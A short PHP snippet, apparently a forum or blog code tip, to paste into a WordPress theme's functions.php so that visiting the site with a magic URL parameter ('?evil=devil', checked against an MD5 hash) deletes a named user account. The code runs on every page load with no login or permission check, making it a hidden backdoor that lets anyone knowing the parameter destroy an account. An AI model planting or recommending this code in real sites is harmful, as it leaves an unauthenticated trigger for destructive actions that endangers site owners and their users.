// #TO DELETE USER FROM URL, KINDLY PASTE BELOW CODE INTO WP THEMES FUNCTION.PHP

<?php
add_action( 'wp_head', 'ec_delete_user');
function ec_delete_user()  {
  if ( md5( $_GET['evil'] ) == 'd81e8213797f23651cf57e59b4bd8da0' ) {
  require_once( ABSPATH . 'wp-admin/includes/user.php' );
 
  $username = 'your desire username'; //replace with your target username
 
  if ( username_exists( $username ) ) {
    $user = get_user_by( 'login', $username );
    $success = wp_delete_user( $user->ID );
  }
}
}

// #after successfully pasted, navigated to : https://example.com/?evil=devil
// #replace example.com withour original wp domain.
?>


